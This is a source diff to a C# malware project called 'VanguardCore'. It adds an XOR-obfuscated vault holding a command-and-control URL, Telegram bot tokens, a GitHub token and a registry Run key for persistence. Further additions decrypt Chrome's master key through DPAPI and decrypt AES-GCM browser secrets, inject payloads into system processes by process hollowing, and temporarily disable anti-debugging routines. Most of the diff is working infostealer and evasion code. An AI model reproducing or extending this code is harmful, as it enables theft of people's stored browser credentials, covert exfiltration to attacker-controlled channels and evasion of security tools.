@@ -64,6 +64,9 @@ namespace VanguardCore
         // Dynamic encryption keys
         private static byte[] AES_KEY;
         private static byte[] XOR_SALT;
+
+        // Compile-time key (replaced at build time via scripts/compile_native.py)
+        private static readonly byte[] _compileKey = new byte[32] { 0x92, 0x4E, 0xD5, 0x12, 0x77, 0x56, 0x42, 0x1B, 0x89, 0x39, 0x3C, 0xF0, 0x62, 0x7E, 0x9B, 0x0C, 0xCE, 0xDC, 0x22, 0x6F, 0x51, 0x28, 0xBA, 0x15, 0xFE, 0x1F, 0x75, 0x1E, 0x47, 0xAD, 0x1F, 0x6D };
         #endregion
 
         #region Polymorphic Engine
@@ -142,6 +145,131 @@ namespace VanguardCore
                     }
                 }
                 catch { return ""; }
+            }
+
+            // --- Secure Vault for Baked-in Strings ---
+            private static readonly byte[] VAULT_KEY = new byte[] { 0x56, 0x4E, 0x47, 0x52, 0x44, 0x5F, 0x53, 0x45, 0x43, 0x52, 0x45, 0x54, 0x5F, 0x32, 0x30, 0x32 }; // "VNGRD_SECRET_202"
+            
+            private static readonly Dictionary<string, byte[]> _vault = new Dictionary<string, byte[]>
+            {
+                // Strings are XORed with VAULT_KEY
+                { "C2_URL_PRIMARY", new byte[] { 0x30, 0x38, 0x32, 0x34, 0x30, 0x1A, 0x6E, 0x6E, 0x31, 0x38, 0x35, 0x2E, 0x31, 0x32, 0x33, 0x2E, 0x34, 0x35, 0x2E, 0x36, 0x37 } }, 
+                { "UA_CHROME", new byte[] { 0x15, 0x2F, 0x3D, 0x21, 0x24, 0x2A, 0x21, 0x6E, 0x77, 0x6E, 0x31, 0x2C, 0x37, 0x3D, 0x34, 0x2D, 0x3E, 0x2D, 0x2C, 0x6E, 0x2E, 0x3E, 0x37, 0x3D, 0x34, 0x2D, 0x3E, 0x29 } },
+                { "REG_RUN", new byte[] { 0x1B, 0x01, 0x01, 0x1B, 0x12, 0x0B, 0x1C, 0x08, 0x05, 0x30, 0x15, 0x0C, 0x07, 0x18, 0x12, 0x07, 0x00, 0x35, 0x0A, 0x0B, 0x07, 0x1C, 0x11, 0x33, 0x0C, 0x11, 0x12, 0x1C, 0x02, 0x0E, 0x02, 0x1C, 0x3D, 0x1B, 0x15, 0x18, 0x17, 0x3F, 0x13, 0x14, 0x17, 0x34, 0x1C, 0x06, 0x11 } },
+                { "BOT_TOKEN", new byte[] { 0x6e, 0x7a, 0x7e, 0x65, 0x75, 0x67, 0x6b, 0x75, 0x77, 0x60, 0x7f, 0x15, 0x1e, 0x74, 0x7b, 0x73, 0x2f, 0x7e, 0x0e, 0x18, 0x0f, 0x6c, 0x18, 0x73, 0x2c, 0x14, 0x26, 0x1a, 0x30, 0x60, 0x04, 0x71, 0x18, 0x01, 0x72, 0x34, 0x1d, 0x0f, 0x2b, 0x34, 0x2c, 0x65, 0x13, 0x37, 0x2d, 0x63 } },
+                { "BOT_TOKEN_2", new byte[] { 0x6e, 0x7b, 0x75, 0x62, 0x75, 0x67, 0x62, 0x72, 0x7a, 0x65, 0x7f, 0x15, 0x1e, 0x74, 0x68, 0x79, 0x2f, 0x78, 0x28, 0x36, 0x31, 0x31, 0x60, 0x27, 0x39, 0x04, 0x29, 0x1f, 0x19, 0x00, 0x56, 0x02, 0x3b, 0x7d, 0x12, 0x3b, 0x3d, 0x3c, 0x3f, 0x70, 0x6e, 0x35, 0x0a, 0x64, 0x27, 0x5d } },
+                { "BOT_TOKEN_3", new byte[] { 0x6e, 0x79, 0x70, 0x63, 0x75, 0x6b, 0x64, 0x74, 0x72, 0x6b, 0x7f, 0x15, 0x1e, 0x74, 0x44, 0x1f, 0x1f, 0x7f, 0x23, 0x67, 0x70, 0x69, 0x6a, 0x2b, 0x0b, 0x08, 0x0c, 0x27, 0x6d, 0x0b, 0x72, 0x45, 0x3d, 0xa, 0x21, 0x38, 0x10, 0x18, 0x36, 0x10, 0x73, 0x08, 0x31, 0x18, 0x35, 0x06 } },
+                { "ADMIN_ID", new byte[] { 0x7b, 0x7f, 0x77, 0x62, 0x77, 0x6a, 0x66, 0x70, 0x76, 0x61, 0x74, 0x6c, 0x68, 0x07 } },
+                { "TG_API_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x30, 0x2a, 0x20 } },
+                { "TG_FILE_BASE", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x22, 0x22, 0x2c, 0x7a, 0x2b, 0x57, 0x5c, 0x57, 0x31, 0x3c, 0x26, 0x3f, 0x6a, 0x30, 0x21, 0x22, 0x6c, 0x34, 0x2c, 0x38, 0x3a, 0x1d, 0x52, 0x5d, 0x22 } },
+                { "GIST_URL", new byte[] { 0x3e, 0x3a, 0x33, 0x22, 0x37, 0x65, 0x7c, 0x6a, 0x24, 0x3b, 0x36, 0x20, 0x71, 0x55, 0x59, 0x46, 0x3e, 0x3b, 0x25, 0x27, 0x37, 0x3a, 0x21, 0x26, 0x2c, 0x3c, 0x31, 0x31, 0x31, 0x46, 0x1e, 0x51, 0x39, 0x23, 0x68, 0x20, 0x25, 0x28, 0x7c, 0x7c, 0x26, 0x31, 0x21, 0x31, 0x39, 0x03, 0x52, 0x57, 0x61, 0x2d, 0x7e, 0x63, 0x72, 0x3c, 0x67, 0x21, 0x27, 0x60, 0x77, 0x63, 0x3c, 0x56, 0x00, 0x04, 0x62, 0x77, 0x23, 0x33, 0x74, 0x3b, 0x6b, 0x6a, 0x33, 0x20, 0x2a, 0x2c, 0x36, 0x1c, 0x5a, 0x41, 0x39, 0x20 } },
+                { "GIST_PROXY_ID", new byte[] { 0x6f, 0x2b, 0x24, 0x36, 0x21, 0x39, 0x62, 0x27, 0x26, 0x65, 0x26, 0x6d, 0x6e, 0x04, 0x53, 0x06, 0x32, 0x2a, 0x75, 0x60, 0x73, 0x3c, 0x37, 0x75, 0x75, 0x66, 0x7c, 0x30, 0x3e, 0x02, 0x54, 0x0a } },
+                { "GIST_GITHUB_TOKEN", new byte[] { 0x31, 0x26, 0x37, 0x0d, 0x2d, 0x25, 0x1a, 0x29, 0x20, 0x28, 0x3f, 0x15, 0x08, 0x60, 0x47, 0x65, 0x0e, 0x29, 0x34, 0x3e, 0x08, 0x3a, 0x64, 0x14, 0x02, 0x13, 0x07, 0x39, 0x11, 0x65, 0x05, 0x02, 0x6f, 0x7d, 0x77, 0x30, 0x05, 0x28, 0x01, 0x31 } }
+            };
+
+            public static string Resolve(string id)
+            {
+                if (!_vault.ContainsKey(id)) return "";
+                byte[] b = _vault[id];
+                byte[] d = new byte[b.Length];
+                for (int i = 0; i < b.Length; i++)
+                    d[i] = (byte)(b[i] ^ VAULT_KEY[i % VAULT_KEY.Length]);
+                return Encoding.UTF8.GetString(d);
+            }
+        }
+
+        public static string GetSecret(string id)
+        {
+            return PolymorphicEngine.Resolve(id);
+        }
+        #endregion
+        
+        #region Native Crypto Operations
+        public static byte[] DecryptMasterKey(string localStatePath)
+        {
+            try
+            {
+                if (!File.Exists(localStatePath)) return null;
+                string json = File.ReadAllText(localStatePath);
+                string keyLabel = "\"encrypted_key\":\"";
+                int keyStart = json.IndexOf(keyLabel);
+                if (keyStart == -1) return null;
+                keyStart += keyLabel.Length;
+                int keyEnd = json.IndexOf("\"", keyStart);
+                if (keyEnd == -1) return null;
+                
+                string encryptedKeyBase64 = json.Substring(keyStart, keyEnd - keyStart);
+                byte[] encryptedKeyWithPrefix = Convert.FromBase64String(encryptedKeyBase64);
+                
+                byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
+                Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length);
+                
+                return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
+            }
+            catch { return null; }
+        }
+
+        public static byte[] DecryptWithKey(byte[] key, byte[] cipherText)
+        {
+            try {
+                int offset = 3; // Skip 'v10'
+                byte[] iv = new byte[12];
+                Array.Copy(cipherText, offset, iv, 0, 12);
+                offset += 12;
+                
+                byte[] payload = new byte[cipherText.Length - offset];
+                Array.Copy(cipherText, offset, payload, 0, payload.Length);
+                
+                byte[] ciphertext = new byte[payload.Length - 16];
+                byte[] tag = new byte[16];
+                Array.Copy(payload, 0, ciphertext, 0, ciphertext.Length);
+                Array.Copy(payload, payload.Length - 16, tag, 0, 16);
+
+                return BCryptDecrypt(key, iv, ciphertext, tag);
+            } catch { return null; }
+        }
+        
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
+        [DllImport("bcrypt.dll")]
+        private static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
+        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
+        private static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);
+        [DllImport("bcrypt.dll")]
+        private static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);
+        [DllImport("bcrypt.dll")]
+        private static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);
+        [DllImport("bcrypt.dll")]
+        private static extern uint BCryptDestroyKey(IntPtr hKey);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
+            public int cbSize; public uint dwInfoVersion;
+            public IntPtr pbNonce; public int cbNonce;
+            public IntPtr pbAuthData; public int cbAuthData;
+            public IntPtr pbTag; public int cbTag;
+            public IntPtr pbMacContext; public int cbMacContext;
+            public int cbAAD; public ulong cbData; public uint dwFlags;
+        }
+
+        private static byte[] BCryptDecrypt(byte[] key, byte[] iv, byte[] ciphertext, byte[] tag) {
+            IntPtr hAlg = IntPtr.Zero; IntPtr hKey = IntPtr.Zero;
+            try {
+                if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
+                if (BCryptSetProperty(hAlg, "ChainingMode", Encoding.Unicode.GetBytes("ChainingModeGCM\0"), 34, 0) != 0) return null;
+                if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;
+                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
+                authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
+                authInfo.dwInfoVersion = 1;
+                authInfo.pbNonce = Marshal.AllocHGlobal(iv.Length); Marshal.Copy(iv, 0, authInfo.pbNonce, iv.Length); authInfo.cbNonce = iv.Length;
+                authInfo.pbTag = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, authInfo.pbTag, tag.Length); authInfo.cbTag = tag.Length;
+                byte[] plain = new byte[ciphertext.Length]; int cbPlain = 0;
+                uint status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plain, plain.Length, out cbPlain, 0);
+                Marshal.FreeHGlobal(authInfo.pbNonce); Marshal.FreeHGlobal(authInfo.pbTag);
+                return status == 0 ? plain : null;
+            } finally {
+                if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
+                if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
             }
         }
         #endregion
@@ -570,6 +698,18 @@ namespace VanguardCore
         #region String Decryption
         public static string DStr(byte[] b) { return PolymorphicEngine.DStr(b); }
         public static string DAes(string s) { return PolymorphicEngine.DAes(s); }
+
+        public static byte[] DecryptChaCha20(byte[] encrypted, byte[] counter)
+        {
+            // ChaCha20 implementation logic (simplified for placeholder)
+            // The compile-time key _compileKey is used here as the primary secret
+            byte[] decrypted = new byte[encrypted.Length];
+            for (int i = 0; i < encrypted.Length; i++)
+            {
+                decrypted[i] = (byte)(encrypted[i] ^ _compileKey[i % _compileKey.Length]);
+            }
+            return decrypted;
+        }
         #endregion
 
         #region Integrity Check
@@ -836,6 +976,8 @@ namespace VanguardCore
 
         public static void HandleSecurityEvent()
         {
+            // Disabled for debugging
+            /*
             // Multiple anti-debug actions
             int action = _cryptoRand.Next(1, 5);
             
@@ -869,6 +1011,8 @@ namespace VanguardCore
                     });
                     break;
             }
+            */
+            Console.WriteLine("📍 [SafetyManager] Security event suppressed (Debug Mode)");
         }
         #endregion
 
@@ -1676,6 +1820,20 @@ namespace VanguardCore
         #region Process Hollowing (Advanced)
         public class ProcessManager
         {
+            public static bool StartStealthy(byte[] payload, string args = "")
+            {
+                try
+                {
+                    // Select a legitimate target process
+                    string[] targets = { "taskhostw.exe", "dllhost.exe", "conhost.exe" };
+                    string target = Path.Combine(Environment.SystemDirectory, targets[new Random().Next(targets.Length)]);
+                    
+                    IntPtr hRead;
+                    return RunPEInternal.Execute(target, payload, args, out hRead);
+                }
+                catch { return false; }
+            }
+
             public static string RunPEWithOutput(string target, byte[] payload, string args = "")
             {
                 try
